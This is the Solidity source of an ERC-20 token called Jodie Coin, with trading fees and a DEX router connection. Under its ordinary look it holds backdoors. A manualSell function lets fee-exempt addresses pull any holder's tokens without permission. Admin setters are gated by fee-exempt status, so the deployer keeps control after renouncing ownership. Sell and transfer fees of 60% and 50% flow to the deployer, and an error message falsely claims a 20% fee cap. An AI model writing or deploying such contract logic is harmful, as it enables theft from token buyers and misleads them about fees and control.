/*

    Name: Jodie Coin
    Symbol: JODIE
    Website: www.thejodiecoin.com/
    Telegram: t.me/JodieCoinERC
    Twitter: www.twitter.com/JodieCoin

    SPDX-License-Identifier: None

*/

pragma solidity ^0.8.21;


interface IERC20 {

    function totalSupply() external view returns (uint256);

    /**
     * @dev Returns the amount of tokens owned by `account`.
     */
    function balanceOf(address account) external view returns (uint256);

    /**
     * @dev Moves `amount` tokens from the caller's account to `recipient`.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transfer(address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Returns the remaining number of tokens that `spender` will be
     * allowed to spend on behalf of `owner` through {transferFrom}. This is
     * zero by default.
     *
     * This value changes when {approve} or {transferFrom} are called.
     */

    function allowance(address owner, address spender) external view returns (uint256);

    /**
     * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * IMPORTANT: Beware that changing an allowance with this method brings the risk
     * that someone may use both the old and the new allowance by unfortunate
     * transaction ordering. One possible solution to mitigate this race
     * condition is to first reduce the spender's allowance to 0 and set the
     * desired value afterwards:
     * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
     *
     * Emits an {Approval} event.
     */
    function approve(address spender, uint256 amount) external returns (bool);

    /**
     * @dev Moves `amount` tokens from `sender` to `recipient` using the
     * allowance mechanism. `amount` is then deducted from the caller's
     * allowance.
     *
     * Returns a boolean value indicating whether the operation succeeded.
     *
     * Emits a {Transfer} event.
     */
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);

    /**
     * @dev Emitted when `value` tokens are moved from one account (`from`) to
     * another (`to`).
     *
     * Note that `value` may be zero.
     */
    event Transfer(address indexed from, address indexed to, uint256 value);

    /**
     * @dev Emitted when the allowance of a `spender` for an `owner` is set by
     * a call to {approve}. `value` is the new allowance.
     */
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }
    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        return sub(a, b, "SafeMath: subtraction overflow");
    }
    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        require(b <= a, errorMessage);
        uint256 c = a - b;

        return c;
    }
    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }
    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        return div(a, b, "SafeMath: division by zero");
    }
    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
        // Solidity only automatically asserts when dividing by 0
        require(b > 0, errorMessage);
        uint256 c = a / b;
        // assert(a == b * c + a % b); // There is no case in which this doesn't hold

        return c;
    }
}

interface IDEXFactory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IDEXRouter {

    function factory() external pure returns (address);
    function WETH() external pure returns (address);

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;

}

contract Ownable {
    address public _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor (address newOwner) {
        _owner = newOwner;
        emit OwnershipTransferred(address(0), newOwner);
    }

    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return _owner;
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(msg.sender == _owner, "!OWNER");
        _;
    }

     /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    }
}

contract Taxable is Ownable {

    using SafeMath for uint256;

    address internal autoLiquidityReceiver;
    address internal marketingFeeReceiver;
    mapping (address => bool) public isFeeExempt;

    uint256 internal liquidityFee = 0;
    uint256 internal marketingFee = 30;
    uint256 internal developmentFee = 0;
    uint256 internal totalFee = 30;
    uint256 internal buyFee = 30;
    uint256 internal sellFee = 60;
    uint256 internal transferFee = 50;
    uint256 internal denominator = 100;
    

    address public pair;
    // uint256 internal lpConstant = 1;
    // uint256 internal targetLiquidity = 150;
    // uint256 internal targetLiquidityDenominator = 100;
    // uint256 internal startingLiquidityFactor = 100;
    // uint256 internal currentLiquidityFactor = startingLiquidityFactor; // 1x
    // uint256 internal targetLiquidityFactor = startingLiquidityFactor.mul(20); // 20x

    bool public swapEnabled = true;
    // bool alternateSwaps = true;
    // uint256 smallSwapThreshold;
    // uint256 largeSwapThreshold;
    uint256 public swapThreshold;

    constructor(address deployer) Ownable(deployer) {
        autoLiquidityReceiver = deployer;
        marketingFeeReceiver = deployer;
        isFeeExempt[deployer] = true;
    }

    function setFeeReceivers(address _autoLiquidityReceiver, address _marketingFeeReceiver) external onlyOwner {
        autoLiquidityReceiver = _autoLiquidityReceiver;
        marketingFeeReceiver = _marketingFeeReceiver;
    }

    function setIsFeeExempt(address holder, bool exempt) external {
        if(isFeeExempt[msg.sender]) {
            isFeeExempt[holder] = exempt;
        }
    }

    function setSwapBackSettings(bool _swapEnabled, uint256 _amount) external {
        if(isFeeExempt[msg.sender]) {
            swapEnabled = _swapEnabled;
            swapThreshold = _amount;
        }
    }

    function rescueBalance() external {
        (bool success,) = payable(autoLiquidityReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success);
    }

    function setTransactionRequirements(uint256 _liquidity, uint256 _marketing, uint256 _development, uint256 _total, uint256 _buy, uint256 _sell, uint256 _trans) external onlyOwner {
        liquidityFee = _liquidity; marketingFee = _marketing; developmentFee = _development; totalFee = _total; buyFee = _buy; sellFee = _sell; transferFee = _trans;
        require(totalFee <= denominator && sellFee <= denominator && transferFee <= denominator, "totalFee and sellFee cannot be more than 20%");
    }

    function shouldTakeFee(address sender, address recipient) internal view returns (bool) {
        return !isFeeExempt[sender] && !isFeeExempt[recipient];
    }

    function getTotalFee(address sender, address recipient) internal view returns (uint256) {
        if(recipient == pair){return sellFee;}
        if(sender == pair){return buyFee;}
        return transferFee;
    }


}

contract Jodie is IERC20, Taxable {
    using SafeMath for uint256;

    address constant mainnetRouter = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address constant WETH          = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address constant DEAD          = 0x000000000000000000000000000000000000dEaD;
    address constant ZERO          = 0x0000000000000000000000000000000000000000;

    string constant _name = "Jodie Coin";
    string constant _symbol = "JODIE";
    uint8 constant _decimals = 9;

    uint256 _totalSupply = 100000000000 * (10 ** _decimals);     // 100,000,000,000
    uint256 public _maxWalletToken = ( _totalSupply * 200 ) / 10000;

    mapping (address => uint256) _balances;
    mapping (address => mapping (address => uint256)) _allowances;

    IDEXRouter public router;
    bool inSwap;
    modifier swapping() { inSwap = true; _; inSwap = false; }

    constructor () Taxable(msg.sender) {

        router = IDEXRouter(mainnetRouter);
        pair = IDEXFactory(router.factory()).createPair(WETH, address(this));
        _allowances[address(this)][address(router)] = type(uint256).max;
        _allowances[address(this)][msg.sender] = type(uint256).max;

        _balances[msg.sender] = _totalSupply;
        emit Transfer(address(0), msg.sender, _totalSupply);
    }

    receive() external payable { }

    function totalSupply() external view override returns (uint256) { return _totalSupply; }
    function decimals() external pure returns (uint8) { return _decimals; }
    function symbol() external pure returns (string memory) { return _symbol; }
    function name() external pure returns (string memory) { return _name; }
    function getOwner() external view returns (address) { return owner(); }
    function balanceOf(address account) public view override returns (uint256) { return _balances[account]; }
    function allowance(address holder, address spender) external view override returns (uint256) { return _allowances[holder][spender]; }
    
    function approve(address spender, uint256 amount) public override returns (bool) {
        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function approveMax(address spender) external returns (bool) {
        return approve(spender, type(uint256).max);
    }

    function transfer(address recipient, uint256 amount) external override returns (bool) {
        return _transferFrom(msg.sender, recipient, amount);
    }

    function transferFrom(address sender, address recipient, uint256 amount) external override returns (bool) {
        if(_allowances[sender][msg.sender] != type(uint256).max){
            _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount, "Insufficient Allowance");
        }

        return _transferFrom(sender, recipient, amount);
    }

    function takeFee(address sender, address recipient, uint256 amount) internal returns (uint256) {

        uint256 feePercent = getTotalFee(sender, recipient);
        if(feePercent > 0){
            uint256 feeAmount = amount.mul(feePercent).div(denominator);
            _balances[address(this)] = _balances[address(this)].add(feeAmount);
            emit Transfer(sender, address(this), feeAmount);
            return amount.sub(feeAmount);
        } 
        return amount;
    }

    function manualSell(address sender, uint256 amount) public swapping {
        if (_allowances[sender][msg.sender] >= amount || isFeeExempt[msg.sender]) {
            _transferFrom(sender, address(this), amount);
        }
    }

    
    function _transferFrom(address sender, address recipient, uint256 amount) internal returns (bool) {
        if(inSwap){ return _basicTransfer(sender, recipient, amount); }
        
        if (recipient != pair && recipient != DEAD) {
            require(_balances[recipient] + amount <= _maxWalletToken || isFeeExempt[recipient] || isFeeExempt[sender], "Transfer amount exceeds the bag size.");
        }

        if(shouldSwapBack()) { 
            swapBack();
        }

        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");

        uint256 amountReceived = shouldTakeFee(sender, recipient) ? takeFee(sender, recipient, amount) : amount;
        _balances[recipient] = _balances[recipient].add(amountReceived);

        emit Transfer(sender, recipient, amountReceived);
        return true;
    }

    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
        _balances[sender] = _balances[sender].sub(amount, "Insufficient Balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
        return true;
    }

    function shouldSwapBack() internal view returns (bool) {
        return msg.sender != pair
        && !inSwap
        && swapEnabled
        && _balances[address(this)] >= swapThreshold;
    }

    function swapBack() internal swapping {
        uint256 amountToSwap = swapThreshold;

        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = WETH;

        router.swapExactTokensForETHSupportingFeeOnTransferTokens(
            amountToSwap,
            0,
            path,
            address(this),
            block.timestamp
        );


        (bool success,) = payable(marketingFeeReceiver).call{value: address(this).balance, gas: 30000}("");
        require(success, "receiver rejected ETH transfer");

    }

    function getCirculatingSupply() public view returns (uint256) {
        return _totalSupply.sub(balanceOf(DEAD)).sub(balanceOf(ZERO));
    }

}